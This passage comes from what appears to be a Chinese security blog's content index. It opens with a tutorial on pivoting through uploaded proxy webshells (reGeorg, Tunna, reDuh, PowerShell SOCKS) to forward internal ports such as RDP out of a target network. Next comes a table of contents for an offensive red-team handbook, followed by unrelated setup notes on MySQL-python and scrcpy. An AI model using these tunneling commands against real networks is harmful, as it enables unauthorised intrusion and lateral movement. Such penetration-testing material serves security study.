<p>上述代理参数配置完毕后，我们在cmd输入一下命令就会出现下面的界面:python2.exe reGeorgSocksProxy.py -p 8888 -u<a href="http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。">http://xxxx:8888/tran.jsp。这样的话我们就把内网的流量代理到外面，我们下一步就可以使用扫描工具进行内网的横向扫描。就这么简单直接。如果内网中的3389只能是内网进行连接的话，我们可以使用mstsc.exe通过代理进行连接3389远程桌面，其它的端口都是一样的道理，灵活运用即可。</a></p>
<h3 id="Tunna端口转发"><a href="#Tunna端口转发" class="headerlink" title="Tunna端口转发"></a>Tunna端口转发</h3><p>Tunna这个工具使用起来也特方便，脚本的编写也是基于Python2版本。运用的时候也需要我们把代理脚本上传到目标服务器，然后通过代理内网的某个端口，注意这个工具只能代理一个端口，有点局限性。但是我们可以代理3389、22、3306、1433等敏感端口，然后将敏感端口流量转发了外网的的某个端口，我们再通过本地连接外网的端口进行连接，这样的话我们就可以使用了。</p>
<p>第一步：我们将代理脚本上传到目标服务器，在浏览器访问代理脚本是否被解析</p>
<p>第二步：运行proxy.py 并指定端口 python proxy.py -u<a href="http://219.x.x.x/conn.jsp">http://192.168.205.143/conn.php </a>-l 1234 -r 3389 -v</p>
<p>第三步：本地执行rdesktop 127.0.0.1:1234</p>
<h3 id="reDuh端口转发"><a href="#reDuh端口转发" class="headerlink" title="reDuh端口转发"></a>reDuh端口转发</h3><p>reDuh也是一款内网渗透利器，这个工具可以把内网服务器的端口通过http/https隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。服务端是个webshell，工具里面针对不同服务器有aspx,php,jsp三个版本，客户端是java写的，本机执行最好装上JDK软件。</p>
<p>我们将代理脚本上传到目标服务器，在本地访问代理脚本</p>
<p>这样我们执行一下三条命令就可以成功将目标主机的3389端口代理到本地的1234端口，本地连接1234端口就可以登陆内网服务器。</p>
<p>java -jar reDuhClient.ja r<a href="http://somesite.com/reDuh.php">http://somesite.com/reDuh.php</a></p>
<p>本地连接1010端口</p>
<p>nc -vv localhost 1010</p>
<p>连接成功会有欢迎提示，之后输入命,在java命令窗口执行</p>
<p>[createTunnel]1234:127.0.0.1:3389</p>
<h3 id="基于powershell的socks代理"><a href="#基于powershell的socks代理" class="headerlink" title="基于powershell的socks代理"></a>基于powershell的socks代理</h3><p>介绍github：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;p3nt4&#x2F;Invoke-SocksProxy&#x2F;master&#x2F;Invoke-SocksProxy.psm1</span><br></pre></td></tr></table></figure>

<p>在1234端口创建一个Socks 4/5 代理:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -bindPort 1234</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105450022-144254035.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105454678-661386867.png" alt="img"></p>
<p>效果:</p>
<p>这里用同网段的另一个win7，使用Proxifer去使用靶机的1234端口进行socks代理</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105508839-410586839.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105513706-1137528557.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105517733-108622092.png" alt="img"></p>
<p>增加线程(默认是200,增加到400,默认端口1080)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line"></span><br><span class="line">Invoke-SocksProxy -threads 400</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1545399-20190419105536542-1886506584.png" alt="img"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>代理转发</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒信息 渗透攻击红队百科全书</title>
    <url>/2020/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AF-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一章  信息搜集</span><br><span class="line">1.1   主机发现</span><br><span class="line">1.2   关联信息生成</span><br><span class="line">1.3   开放漏洞情报</span><br><span class="line">1.4   开源情报信息搜集(OSINT)</span><br><span class="line">1.5   Github Hacking</span><br><span class="line">1.6   Google Hacking</span><br><span class="line">1.7   Gitlcret</span><br><span class="line">1.8   Mailsniper.psl获取Outlook所有联系人</span><br><span class="line">1.9   内网渗透之信息收集</span><br><span class="line">1.10   后渗透信息收集之Wmic命令的一些使用方法</span><br><span class="line">1.ll   内网横向常见端口</span><br><span class="line">第二章  打点内网</span><br><span class="line">2.1       外部接入点</span><br><span class="line">2.1.1     无线攻击实战应用之DNSSpoof.Evil Portal.DWall组合拳入侵</span><br><span class="line">2.2       应用系统漏洞利用</span><br><span class="line">2.2.1     常见漏洞扫描</span><br><span class="line">2.2.1.1   Impacket框架之Mssql服务器安全检测</span><br><span class="line">2.2.1.2   MS17_010 py脚本利用</span><br><span class="line">2.2.2     未授权访问漏洞</span><br><span class="line">2.2.2.1   未授权漏洞总结</span><br><span class="line">2.2.2.2   JBOSS未授权访问</span><br><span class="line">2.2.3     远程代码执行漏洞</span><br><span class="line">2.2.3.1   Java下奇怪的命令执行</span><br><span class="line">2.2.3.2   Shiro反序列化记录</span><br><span class="line">2.2.3.3   RMI列化</span><br><span class="line">2.2.3.4   JNDI注入</span><br><span class="line">2.2.3.5   Fastjson 漏洞浅析</span><br><span class="line">2.2.3.6   CVE19043 PHP 远程代码执行复现</span><br><span class="line">2,2.3.7   Java WebsheIl从入门到入狱系列1基础篇</span><br><span class="line">2.2.3.8   深究XMl.decoder</span><br><span class="line">2.2:3.9   Fast.Json度序列化学习</span><br><span class="line">2.2.3.10   Oracle数据库安全思考之Xml反序列化</span><br><span class="line">2.2.3.11   Webshe11绕安全模式执行命令</span><br><span class="line">2.2.3.I2   Java 下的XXE漏洞</span><br><span class="line">2.2.3.13   Solr Velocity 模板远程代码复现及利用指南</span><br><span class="line">2.2.3.14   SolrEaloeitymplate</span><br><span class="line">2.2.3.15   Java Webshell从入门到入狱系列2对抗之Bypass上篇</span><br><span class="line">2.2:3.16   Java Webshel1 从入门到入狱系列3对抗之Bypass</span><br><span class="line">2.2.3.17   Java Webshell 从入门到入球系列4对抗之Bypass一下篇</span><br><span class="line">2.2.3.18   Java&#39;反序列化过程深究</span><br><span class="line">2.2.3.19   Apache Solr不安全配置远程代码执行漏润复现及Jmx Rml利用分析</span><br><span class="line">2.2.3.20   Java命令执行小细节</span><br><span class="line">2.2.3.21   JDK反序列化Gadgets21</span><br><span class="line">2.2.3.22   WeblogicE1990alysis</span><br><span class="line">2.23.23  Spring Boottuators未授权漏淘</span><br><span class="line">2.2.3.24   SEMCMS2.6后台文件上传漏洞审计</span><br><span class="line">2.2.3.25   代码审计之Lvyecms后台Getshell</span><br><span class="line">2.2.3.26   Log4jserializealysis</span><br><span class="line">2.2.3.27   Java反序列化stJson 组件</span><br><span class="line">2.2.3.28   Springcuriyuth2(CVE1860)</span><br><span class="line">2.2.4      WAFpass</span><br><span class="line">2:2.5      登陆口JS前端加密绕过</span><br><span class="line">2.2.6      Xmldecoder标签</span><br><span class="line">2.2.7      利用 Php My Admin去Get Shell</span><br><span class="line">2.2.8      攻击JMT的一些方式</span><br><span class="line">2.2.9     上传漏洞 </span><br><span class="line">2.2.9.1   上传漏洞</span><br><span class="line">2.2.10    注入漏洞</span><br><span class="line">2.2.10.1   注入漏洞</span><br><span class="line">2.2.10.2   MSSQL利用总结</span><br><span class="line">2.2.10.3   攻击MSSQL—werUpSQL介绍</span><br><span class="line">2.2.10.4   如何利用Mysql安全特性发现漏洞</span><br><span class="line">2.2.10.5    Hibernate基本注入</span><br><span class="line">2.2.10.6    My Sql利用General_Log_File.Slow_Query_Log_File 写文件</span><br><span class="line">2.2.10.7   【会战分享】SQL Server注入Getshell</span><br><span class="line">2.2.11   文件读取漏洞</span><br><span class="line">2.2.12    Pentesterlab Xss</span><br><span class="line">2.2.13    Office宏的基本利用</span><br><span class="line">2.2.14    Javacuritylendar19ndyne</span><br><span class="line">2.2.15    Discuz Ssrf Rce漏洞分析报告</span><br><span class="line">2.2.16    WordPress语言文件代码执行漏洞分析报告</span><br><span class="line">2.2.17    Struts2远程命令执行S28 漏洞分析报告</span><br><span class="line">2.2.18   静态免杀Php一句话(已过D盾，河马，安全狗）</span><br><span class="line">2.2.19   金融信息系统安全测评方法</span><br><span class="line">2.2.20    ApacheiE一Analysis</span><br><span class="line">2.2.21   记一次阿里主站Xss测试及绕过WAF防护</span><br><span class="line">2.2.22    ClassLoader类加载机制</span><br><span class="line">2.2.23   浅谈SSRF原理及其利用</span><br><span class="line">2.2.24    Springtammons (CVE1873) </span><br><span class="line">2.2.25   Xss绕过代码后端长度限制的方法</span><br><span class="line">2.2.26   Mysql提权之MOF</span><br><span class="line">2.2.27   Mysql提权之UDF</span><br><span class="line">2.2.28    Xss基础学习</span><br><span class="line">2.2.29    Java反射与内存Shell初探Jetty容器的Shell维权</span><br><span class="line">2.2.30   利用DNSLOG回显</span><br><span class="line">2.2.31   文件合成&#x2F;图片马生成</span><br><span class="line">2.2.32    UDF 提权</span><br><span class="line">2.4   社会工程学</span><br><span class="line">2.4.1   水坑攻击</span><br><span class="line">2.4.2   鱼叉攻击 </span><br><span class="line">2.4.2.1   Swaks邮件伪造</span><br><span class="line">2.4.2.2   邮件伪造防御技术</span><br><span class="line">2.4.3   钓鱼攻击 </span><br><span class="line">2.4.3.1   视觉效果 </span><br><span class="line">2.4.3.1.1   凭证劫持漏洞</span><br><span class="line">2.4.3.2   克隆技术</span><br><span class="line">2.4.3.3    Word文档云宏代码钓鱼</span><br><span class="line">2.2.5    APP密码算法通用分析方法</span><br><span class="line">2.2.6   Linux下反弹shell命令</span><br><span class="line">2.2.7   Browser Pivot for Chrome</span><br><span class="line">第三章  命令与控制</span><br><span class="line">3.1   HTTP隧道ABPTTS第一季</span><br><span class="line">3.2   HTTP隧道reGeorg第二季 </span><br><span class="line">3.3   HTTP隧道Tunna第三季</span><br><span class="line">3.4   HTTP隧道reDuh第四季</span><br><span class="line">3.5   基于Ptunnel建立ICMP隧道</span><br><span class="line">3.6   使用anydesk做远控</span><br><span class="line">3.7   防御域内委派攻击</span><br><span class="line">3.8   ATT&amp;CK攻防初窥系列执行篇</span><br><span class="line">3.9   Powershell</span><br><span class="line">3.9.1   利用36O正则不严执行powershell上线</span><br><span class="line">3.9.2   关于Powershell对抗安全软件</span><br><span class="line">3.9.3   InvokeObfuscation介绍</span><br><span class="line">第四章  穿透与转发</span><br><span class="line">4.1   Frp内网穿透实战</span><br><span class="line">4.2   基于Portfwd端口转发</span><br><span class="line">4.3   Venom代理转发、多级穿透</span><br><span class="line">4.4   DNS隧道</span><br><span class="line">4.4.1   DNS隧道之DNS 2 TCP</span><br><span class="line">4.4.2   DNS隧道之DNSCAT 2</span><br><span class="line">4.4.3   使用DNS协议上线MSF 之Iodine篇</span><br><span class="line">4.4.4   使用DNS协议上线MSF 之DNSCAT2篇</span><br><span class="line">4.4.5   使用DNS协议上线MSF之 DNS 2 TCP篇</span><br><span class="line">第五章  内部信息搜集</span><br><span class="line">5.1   本地信息搜集 </span><br><span class="line">5.1.1   用普通权限的域帐户获得域环境中所有DNS解析记录</span><br><span class="line">5.1.2   凭证及令牌票据</span><br><span class="line">5.1.3.1   内存转储获取本地HASH</span><br><span class="line">5.1.4.2   转储域账户哈希值</span><br><span class="line">5.1.5.3   转储域账户哈希值(续)</span><br><span class="line">5.1.6.4   SPN发现与利用</span><br><span class="line">5.1.7.5   哈希传递远程登录篇</span><br><span class="line">5.1.3   用户习惯</span><br><span class="line">5.1.3.1   从目标文件中做信息搜集第一季</span><br><span class="line">5.1.4   获取当前系统所有用户的谷歌浏览器密码</span><br><span class="line">5.1.5   Windows2003获取密码之Adsutil.wbs</span><br><span class="line">5.1.6   解密目标机器保存的rdp 凭证</span><br><span class="line">5.1.7   HASHcat破解HASH 神器详解</span><br><span class="line">5.1.8   解密SecureCRT客户端中保存的密码HASH</span><br><span class="line">5.1.9   解密Winscp客户端中保存的密码HASH</span><br><span class="line">5.1.10  破解Weblogic配置文件中的数据库密码</span><br><span class="line">5.1.11  获取域控&#x2F;系统日志.</span><br><span class="line">5.2   网络信息搜集</span><br><span class="line">5.2.1   发现目标Web程序敏感目录第一季</span><br><span class="line">5.2.2   基于SCF做目标内网信息搜集第二季</span><br><span class="line">5.2.3   域环境信息搜集</span><br><span class="line">5.2.3.1   Active Directory Domain Services获取域控信息</span><br><span class="line">5.2.3.2   Windows域渗透―用户密码枚举</span><br><span class="line">5.2.3.3   不同环境下域DNS记录信息收集方法 </span><br><span class="line">5.2.3.4   Impacket框架之域信息获取 </span><br><span class="line">5.2.3.5   域信息收集之user2sid，sid2user</span><br><span class="line">5.2.4   工作组环境信息搜集</span><br><span class="line">5.2.4.1   基于MSF发现内网存活主机第一季</span><br><span class="line">5.2.4.2   基于MSF发现内网存活主机第二季</span><br><span class="line">5.2.4.3   基于MSF发现内网存活主机第三季</span><br><span class="line">5.2.4.4   基于MSF发现内网存活主机第四季</span><br><span class="line">5.2.4.5   基于MSF发现内网存活主机第五季</span><br><span class="line">5.2.4.6   基于MSF发现内网存活主机第六季</span><br><span class="line">5.2.4.7   基于SqlDataSourceEnumerator发现内网存活主机</span><br><span class="line">5.2.4.8   基于ICMP发现内网存活主机.</span><br><span class="line">5.2.4.9   基于UDP发现内网存活主机·</span><br><span class="line">5.2.4.10   基于ARP发现内网存活主机</span><br><span class="line">5.2.4.11   基于Snmp发现内网存活主机</span><br><span class="line">5.2.4.12   基于Netbios发现内网存活主机</span><br><span class="line">5.2.5   Powershell一条命令行进行内网扫描.</span><br><span class="line">5.2.6   内网信息收集之内网代理</span><br><span class="line">第六章  权限提升</span><br><span class="line">6.1   操作系统提权·</span><br><span class="line">6.1.1   Linux </span><br><span class="line">6.1.1.1   Linux提权依赖exp篇（第二课）</span><br><span class="line">6.1.1.2   Sudo 漏洞分析（CVE201914287)</span><br><span class="line">6.1.1.3   linux提权(一)之内核提权·</span><br><span class="line">6.1.2   Windows</span><br><span class="line">6.1.2.1    Windows提权快速查找EXP（第一课）·</span><br><span class="line">6.1.2.2   Token窃取与利用 </span><br><span class="line">6.1.2.3   CVE20191388 Windows UAC</span><br><span class="line">第七章  权限维持</span><br><span class="line">7.1   操作系统后门 </span><br><span class="line">7.1.1    Linux </span><br><span class="line">7.1.2    Windows    </span><br><span class="line">7.1.2.1   对抗权限长期把控伪造无效签名第一季</span><br><span class="line">7.1.2.2   常见Windows持久控制总结</span><br><span class="line">7.1.2.3   Windows RID 劫持.</span><br><span class="line">7.1.2.4   Shfit映像劫持后门新玩法</span><br><span class="line">7.1.2.5   Windows权限维持篇注册表维权–.</span><br><span class="line">7.1.2.6   Windows权限维持篇2计划任务维权·</span><br><span class="line">7.1.2.7   Windows权限维持篇3服务Service维权</span><br><span class="line">7.2   第三方组件后门.</span><br><span class="line">7.3   APT对抗〔一）红蓝对抗关于后门对抗</span><br><span class="line">7.4   APT对抗二）红蓝对抗关于后门对抗</span><br><span class="line">7.5   APT对抗（三）红蓝对抗关于后门对抗</span><br><span class="line">7.6   APT对抗（四）红蓝对抗关于后门对抗·</span><br><span class="line">7.7   DLL劫持两种劫持方法剖析</span><br><span class="line">7.8   APT对抗（五）红蓝对抗关于后门对抗·</span><br><span class="line">7.9   APT对抗（六）红蓝对抗关于后门对抗·</span><br><span class="line">7.10  APT对抗（七）红蓝对抗关于后门对抗.</span><br><span class="line">7.11  ATT&amp;CK攻防初窥系列横向移动篇·</span><br><span class="line">7.12  Linux权限维持之LD_PRELOAD </span><br><span class="line">7.13  Linux权限维持之进程注入</span><br><span class="line">7.14  Windows权限维持之Office启动</span><br><span class="line">第八章 内网渗透基础</span><br><span class="line">8.1  Kerberos协议 </span><br><span class="line">8.1.1   Windows认证原理之Kerberos篇</span><br><span class="line">8.2  NTLM    </span><br><span class="line">8.2.1  NTLM协议及HASH 抓取</span><br><span class="line">8.2.2  Windows 认证原理之NTLM篇</span><br><span class="line">8.3  内网命令行渗透笔记.</span><br><span class="line">8.4  内网渗透中的文件传输第一季</span><br><span class="line">8.5  Msfvenom常用生成Payload命令</span><br><span class="line">8.6  Windows环境压缩文件&amp;文件夹命令合集</span><br><span class="line">8.7  Windows net命令集使用</span><br><span class="line">8.8  CobaltStrike 与Metasploit实战联动</span><br><span class="line">8.9  渗透中常用的复制工具</span><br><span class="line">第九章 红队自研</span><br><span class="line">9.1  免杀方案研发</span><br><span class="line">9.1.1  实战免杀诺顿Shellcode载入内存免杀</span><br><span class="line">9.1.2  人人都能过杀软</span><br><span class="line">9.1.3  远控木马极速免杀360五引擎 </span><br><span class="line">9.1.4  基于Ruby内存加载Shellcode第一季</span><br><span class="line">9.1.5  DLL加载Shellcode 免杀上线</span><br><span class="line">9.1.6  借助Aspx对Payload进行分离免杀·</span><br><span class="line">9.1.7  静态恶意代码逃逸(第一课)</span><br><span class="line">9.1.8  静态恶意代码逃逸(第二课).</span><br><span class="line">9.1.9  静态恶意代码逃逸∈第三课) </span><br><span class="line">9.1.10  静态恶意代码逃逸（第四课）</span><br><span class="line">9.1.11  静态恶意代码逃逸（第五课）</span><br><span class="line">9.1.12  基于Python内存加载Shellcode第二季</span><br><span class="line">9.1.13  Payload分离免杀思路– </span><br><span class="line">9.1.14  基于实战中的Small Payload应用——第一季</span><br><span class="line">9.1.15  基于实战中的Small Payload应用——第二季.</span><br><span class="line">9.1.16  基于Go内存加载Shellcode第三季.</span><br><span class="line">9.1.17  免杀技术之msf偏执模式</span><br><span class="line">9.1.18  免杀技术之生成Shellcode自行编译·</span><br><span class="line">9.1.19  免杀技术之代码加密·</span><br><span class="line">9.1.20  免杀技术之使用c实现Meterpreter功能</span><br><span class="line">9.1.21  白加黑免杀过360开机启动拦截·</span><br><span class="line">9.1.22  使用C#实现简单的分离兔杀</span><br><span class="line">第十章 安全工具教学</span><br><span class="line">10.1   Impacket套件之远程命令执行功能讲解.</span><br><span class="line">10.2   Bloodhound 技术讲解</span><br><span class="line">10.3   Windows 10配置搭建Kali环境第一季.</span><br><span class="line">10.4   与CrackMapExec结合攻击   </span><br><span class="line">10.5   Meterpreter下的Irb操作第一季</span><br><span class="line">10.6   基于第十课补充Payload(—)</span><br><span class="line">10.7   基于第十课补充 Payload(二)  </span><br><span class="line">10.8   域信息收集之普通域用户权限获取域里详细信息ldifde工具</span><br><span class="line">10.9   域信息收集csvde工具</span><br><span class="line">10.10  xSS 之Beef神器―.</span><br><span class="line">10.11  Pstools讲解(远程执行命令&amp;登录日志导出等)</span><br><span class="line">10.12  Netcat使用总结</span><br><span class="line">10.13  五分钟快速编写漏洞EXP </span><br><span class="line">第十一章 红队技巧</span><br><span class="line">11.1  基于白名单Msbuild.exe执行Payload第一季</span><br><span class="line">11.2  基于白名单Installutil.exe执行Payload第二季</span><br><span class="line">11.3  基于白名单regasm.exe执行Payload第三季 </span><br><span class="line">11.4  基于白名单regsvcs.exe执行Payload第四季</span><br><span class="line">11.5  基于白名单Mshta.exe执行Payload第五季</span><br><span class="line">11.6  基于白名单Compiler.exe执行Payload第六季</span><br><span class="line">l1.7  基于白名单Csc.exe执行Payload第七季</span><br><span class="line">11.8  基于白名单Msiexec执行Payload第八季</span><br><span class="line">11.9  基于白名单Regsvr32执行Payload第九季</span><br><span class="line">11.10 基于白名单Wmic执行Payload第十季</span><br><span class="line">11.11 基于白名单RunDLL32.exe执行Payload第十一季</span><br><span class="line">l1.12 基于白名单Odbcconf执行Payload第十二季·</span><br><span class="line">11.13 基于白名单PsExec执行Payload第十三季.</span><br><span class="line">11.14 基于白名单Forfiles执行Payload第十四季</span><br><span class="line">11.15 基于白名单Pcalua执行Payload第十五季</span><br><span class="line">11.16 基于白名单Cmstp.exe执行Payload第十六季·</span><br><span class="line">11.17 基于白名单Ur1.DLL执行Payload第十七季</span><br><span class="line">11.18 基于白名单zipfldr.DLL执行Payload第十八季</span><br><span class="line">11.19 基于白名单msiexec执行Payload补充</span><br><span class="line">11.20 基于白名单Ftp.exe执行Payload第十九季―.</span><br><span class="line">11.21 网络安全学习方法论之体系的重要性</span><br><span class="line">第十二章 工具优化及分享</span><br><span class="line">12.1  解决Msfvenom命令自动补全</span><br><span class="line">12.2  工具介绍thebackdoorfactory（第九课）</span><br><span class="line">12.3  工具介绍VeilEvasion(第十一课）</span><br><span class="line">12.4  离线CyberChef使用指南·</span><br><span class="line">第十三章  案例分享</span><br><span class="line">13.1  某次项目技术点实录Regsvr32 ole对象·</span><br><span class="line">13.2  阿里云Access Token问题–项目收获记录</span><br><span class="line">13.3  从打点到域控的练习 </span><br><span class="line">13.4  安防软件 Bypass</span><br><span class="line">13.5  Docker常用命令与Docker逃逸漏洞复现</span><br><span class="line">13.6  渗透沉思录  </span><br><span class="line">13.7  项目回忆:体系的本质是知识点串联</span><br><span class="line">13.9  漏洞修复系列之Oracle远程数据投毒漏洞修复(非RAC环境)</span><br><span class="line">13.10 记一次Ueditor老版本的非常规Getshell </span><br><span class="line">13.11 云安全共测大赛初赛Game App题目解析</span><br><span class="line">13.12 三层靶机搭建及其内网渗透（附靶场环境）</span><br><span class="line">13.13 记一次简单的漏洞利用与横向.</span><br><span class="line">13.14 翻译文章   </span><br><span class="line">13.14.1    CVE201912757:Symantec Endpoint Protection中的本地特权升级</span><br><span class="line">13.14.2    攻击SQLServer CLR程序集 </span><br><span class="line">13.14.3    AMTHoneypot蜜罐指南（翻译）</span><br><span class="line">13.14.4    Honeypotcamera蜜罐指南(翻译）</span><br><span class="line">13.14.5    (译文)Cobalt Strike使用混淆绕过WindowsDefender</span><br><span class="line">13.15      渗透实战从打点到域控的全过程</span><br><span class="line">13.16      Docker极速入门 </span><br><span class="line">13.17      记一次应急响应样本分析</span><br><span class="line">第十四章  运营</span><br><span class="line">14.1      如何将金字塔原理在运营中应用</span><br><span class="line">14.2      活动心得——如何举办一场沙龙活动 </span><br><span class="line">14.3      从用户中来，到用户中去</span><br><span class="line">14.4      文章与活动之间的关联﻿</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>红队百科全书</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac os 安装Mysql-Python</title>
    <url>/2020/08/01/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Mac-os-%E5%AE%89%E8%A3%85Mysql-Python/</url>
    <content><![CDATA[<h1 id="Mac-os-安装Mysql-python"><a href="#Mac-os-安装Mysql-python" class="headerlink" title="Mac os 安装Mysql-python"></a>Mac os 安装Mysql-python</h1><h2 id="安装环境情况"><a href="#安装环境情况" class="headerlink" title="安装环境情况"></a>安装环境情况</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/version1.png" width="300" height="200">

<h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install MySql-python</span><br></pre></td></tr></table></figure>
<p><strong>通常这样是行不通的</strong></p>
<h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0. brew install mysql</span><br><span class="line">1. brew unlink mysql # 如果已经安装</span><br><span class="line">2. brew install mysql-connector-c # 安装mysql依赖文件</span><br><span class="line">3. which mysql_config # 查看本地mysql_config 文件在哪</span><br><span class="line">4. vim mysql_config 找到</span><br><span class="line">    libs&#x3D;&quot;$libs -l&quot;</span><br><span class="line">    替换为</span><br><span class="line">    lib&#x3D;&quot;$libs -lmysqlclient -lssl -lcrypto&quot;</span><br><span class="line">    # 新版mysql可能已经替换</span><br><span class="line">5. pip install mysqlclinet</span><br><span class="line">6. pip install MySql-python</span><br><span class="line">7. brew unlink mysql-connector-c</span><br><span class="line">8. brew link mysql</span><br></pre></td></tr></table></figure>

<h2 id="遇见错误"><a href="#遇见错误" class="headerlink" title="遇见错误"></a>遇见错误</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_mysql.c:36:10: fatal error: &#39;my_config.h&#39; file not found</span><br><span class="line">#include &quot;my_config.h&quot;</span><br><span class="line">         ^~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br><span class="line">error: command &#39;cc&#39; failed with exit status 1</span><br></pre></td></tr></table></figure>

<h2 id="错误原因"><a href="#错误原因" class="headerlink" title="错误原因"></a>错误原因</h2><p><strong>1. 未安装mysql-connector-c 缺少对应库</strong><br><strong>2. 安装了新版的mysql默认没有my_config文件</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/my_config.png" width="800" height="300"></p>
<p>**这是mysql 8.0.19默认库文件，确实没有my_config.h，这个时候我们需要copy一份</p>
<p>将mysql.h copy 一份重命名为 my_config.h<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/cp.png" width="800" height="70"></p>
<p><strong>然后在进行安装即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install MySql-python</span><br></pre></td></tr></table></figure>

<p>参考stackoverflow，原文：<a href="https://stackoverflow.com/questions/12218229/my-config-h-file-not-found-when-install-mysql-python-on-osx-10-8">stackoverflow</a></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>Mac os</tag>
        <tag>Python</tag>
        <tag>Mysql-python</tag>
      </tags>
  </entry>
  <entry>
    <title>scrcpy使用</title>
    <url>/2020/08/04/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/scrcpy%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="scrcpy使用"><a href="#scrcpy使用" class="headerlink" title="scrcpy使用"></a>scrcpy使用</h2><blockquote>
<p>简单地来说，scrcpy就是通过adb调试的方式来将手机屏幕投到电脑上，并可以通过电脑控制您的Android设备。它可以通过USB连接，也可以通过Wifi连接（类似于隔空投屏），而且不需要任何root权限，不需要在手机里安装任何程序。scrcpy同时适用于GNU / Linux，Windows和macOS。</p>
</blockquote>
<p>它的一些特性：</p>
<ul>
<li>亮度（原生，仅显示设备屏幕）</li>
<li>性能（30~60fps）</li>
<li>质量（1920×1080或以上）</li>
<li>低延迟（35~70ms）</li>
<li>启动时间短（显示第一张图像约1秒）</li>
<li>非侵入性（设备上没有安装任何东西）</li>
</ul>
<p>此项目为开源项目，Github地址：<a href="https://github.com/Genymobile/scrcpy">Genymobile/scrcpy: Display and control your Android device</a></p>
<h2 id="使用scrcpy的要求"><a href="#使用scrcpy的要求" class="headerlink" title="使用scrcpy的要求"></a>使用scrcpy的要求</h2><ol>
<li>Android设备至少需要API 21（Android 5.0以上版本）;</li>
<li>确保在您的设备上启用了<a href="https://developer.android.com/studio/command-line/adb.html#Enabling">adb调试</a>;</li>
<li>在某些设备上，您还需要启用<a href="https://github.com/Genymobile/scrcpy/issues/70#issuecomment-373286323">其他选项</a>以使用键盘和鼠标控制它。</li>
</ol>
<h2 id="使用USB进行连接"><a href="#使用USB进行连接" class="headerlink" title="使用USB进行连接"></a>使用USB进行连接</h2><p>此方式推荐使用，相对更加流畅。</p>
<ol>
<li>手机通过USB连接到PC上，首次连接会弹出是否信任该电脑，点击始终信任即可。</li>
<li>运行<code>adb usb</code>查看是否连接成功</li>
</ol>
<h2 id="使用无线连接"><a href="#使用无线连接" class="headerlink" title="使用无线连接"></a>使用无线连接</h2><p>可参考官方文档：<a href="https://www.genymotion.com/blog/open-source-project-scrcpy-now-works-wirelessly/">Open Source Project - Scrcpy now works wirelessly</a></p>
<p>此连接方式更加方便快捷，若宽带速率高，使用效果更佳，使用方法也非常简单。</p>
<ol>
<li>确保PC和手机在同一Wifi中</li>
<li>手机先通过USB与PC相连</li>
<li>在PC上运行 adb tcpip 服务端口，如端口为5555</li>
<li>拔下你的设备，断开USB连接</li>
<li>在PC上运行 adb connect 手机IP:服务端口（手机IP可通过手机的<code>状态信息</code>查看，或者登录路由器查看，一般以192.168开头）</li>
<li>运行scrcpy，在cmd中输入<code>scrcpy.exe</code></li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200905170438521-9918429.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-9918429.png" alt="img"></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>scrcpy</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Cocoon XML注入 (CVE-2020-11991)</title>
    <url>/2020/09/14/WEB/Exploit/Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991/</url>
    <content><![CDATA[<p>程序使用了StreamGenerator这个方法时,解析从外部请求的xml数据包未做相关的限制,恶意用户就可以构造任意的xml表达式,使服务器解析达到XML注入的安全问题。</p>
